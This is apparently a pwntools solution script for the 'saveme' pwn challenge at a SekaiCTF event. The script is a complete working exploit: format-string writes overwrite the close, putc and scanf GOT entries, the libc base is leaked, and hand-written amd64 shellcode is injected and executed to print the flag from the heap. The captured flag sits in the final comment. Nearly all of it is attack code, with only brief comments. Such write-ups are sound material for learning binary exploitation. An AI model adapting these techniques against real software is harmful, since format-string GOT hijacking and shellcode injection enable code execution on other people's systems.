from pwn import *
from Crypto.Util.number import bytes_to_long

elf = ELF('./saveme', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
# p = elf.process()
p = remote('challs.ctf.sekai.team', 4001)
leak_addr = eval(b'0x' + p.recvline_contains(b'gift: ').split(b'0x')[-1][:12])
p.sendline(b'2')

# overwrite got@close to address before scanf for unlimited input
target_value1 = p64(0x004014f9, endian='big')
fmt_str  = '%{:d}x'.format(0x40).encode() + b'%*0$n'
fmt_str  += '%{:d}x'.format((bytes_to_long(target_value1[-2:]) - 0x40) & 0xffff).encode() + b'%*1$hn'

# overwrite putc to function before read flag file content, but this is only write content at $rbp-0x10
target_value2 = p64(0x004013bd, endian='big')
fmt_str  += '%{:d}x'.format((bytes_to_long(target_value2[-2:]) - bytes_to_long(target_value1[-2:])) & 0xffff).encode() + b'%*2$hn'

# calculate offset
RoundUp = lambda x: ((x + 7) & (-8))
fmt_str += b'X'*(RoundUp(len(fmt_str))-len(fmt_str))
total_offset = int(len(fmt_str)/8)
offset = 8 + total_offset
for i,_ in enumerate(fmt_str.split(b'*')[1:]):
    fmt_str = fmt_str.replace('*{:d}'.format(i).encode(), '{:d}'.format(offset + i).encode())

# first payload
payload = b''.join([
    fmt_str, 
    # 0
    p64(elf.got['close']+2),
    # 1
    p64(elf.got['close']),
    # 2
    p64(elf.got['putc']),
])
print('total',len(payload))

p.sendlineafter(b'person: ', payload)
p.recvuntil(b'@@')
p.sendline(b'fool')

# leak libc
p.sendline(b'%23$p')
libc_leak = eval(p.recv(14))
libc.address = eval(hex(libc_leak - libc.sym['__libc_start_main'])[:-3] + '000')
log.info(f'__libc_start_main     @ 0x{libc_leak:x}')
log.info(f'libc base             @ 0x{libc.address:x}')
# p64(libc.address + 0x1ec2c8)


# overwrite rbp-0x10 for arbitrary write what where
# targeting to mmap address
# then overwrite next got call (scanf) to that mmap address for shellcode execution
target_value1 = p64(0x405000, endian='big')
fmt_str  = '%{:d}x'.format(0x40).encode() + b'%*0$n'
fmt_str  += b'%*1$n'
fmt_str  += '%{:d}x'.format((bytes_to_long(target_value1[-2:]) - 0x40) & 0xffff).encode() + b'%*2$hn'
fmt_str  += b'%*3$hn'

# calculate offset
offset = 6 + 0x30
for i,_ in enumerate(fmt_str.split(b'*')[1:]):
    fmt_str = fmt_str.replace('*{:d}'.format(i).encode(), '{:d}'.format(offset + i).encode())

# input this payload with @read
payload = b''.join([
    p64(leak_addr+0x68-(8*3)+2),
    p64(elf.got['__isoc99_scanf']+2),
    p64(leak_addr+0x68-(8*3)),
    p64(elf.got['__isoc99_scanf']),
])
p.sendline(payload)

# input this payload with @scanf->@printf
p.sendline(fmt_str)
p.recvuntil(b'0')

# input this payload with @read
# write 0x50 size shellcode then jmp into it
main_arena_heap = libc.address + 0x1ec2c8
heap_flag_offset = 0x290 + 0x10
shellcode = asm(f'''
movabs rsi, 0x{(main_arena_heap):x}
mov rsi, qword ptr [rsi]
add rsi, 0x{heap_flag_offset:x}
mov rdx, 0x50
mov rdi, 1
mov rax, rdi
syscall
''', arch='amd64')
p.sendline(shellcode)

p.interactive()
# SEKAI{Y0u_g0T_m3_n@w_93e127fc6e3ab73712408a5090fc9a12}